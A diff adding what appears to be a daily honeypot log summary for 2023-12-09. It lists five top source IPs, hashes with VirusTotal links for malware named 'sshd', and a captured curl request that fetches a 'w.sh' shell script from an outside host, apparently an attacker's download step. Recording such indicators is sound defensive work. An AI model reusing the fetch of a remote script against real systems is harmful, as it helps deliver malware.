@@ -1,0 +1,23 @@
+Top 5 IPs for 2023-12-09:
+103.238.234.28
+129.226.194.95
+165.154.241.11
+221.161.235.166
+34.176.48.134
+
+
+Malware seen: 
+File name: sshd
+Hash: 94f2e4d8d4436874785cd14e6e6d403507b8750852f7f2040352069a75da4c00
+https://www.virustotal.com/gui/file/94f2e4d8d4436874785cd14e6e6d403507b8750852f7f2040352069a75da4c00
+Hash: 55f7d9e99b8e2d4e0e193b2f0275501e6d9c1ebd29cadbea6a0da48a8587e3e0
+https://www.virustotal.com/gui/file/55f7d9e99b8e2d4e0e193b2f0275501e6d9c1ebd29cadbea6a0da48a8587e3e0
+Hash: 01d54b64499f6bf75c410ac0db307467d5ba599996faffa3818475ec0964369d
+https://www.virustotal.com/gui/file/01d54b64499f6bf75c410ac0db307467d5ba599996faffa3818475ec0964369d
+
+GET /w.sh HTTP/1.1
+Host: 93.123.85.124
+User-Agent: curl/7.73.0
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
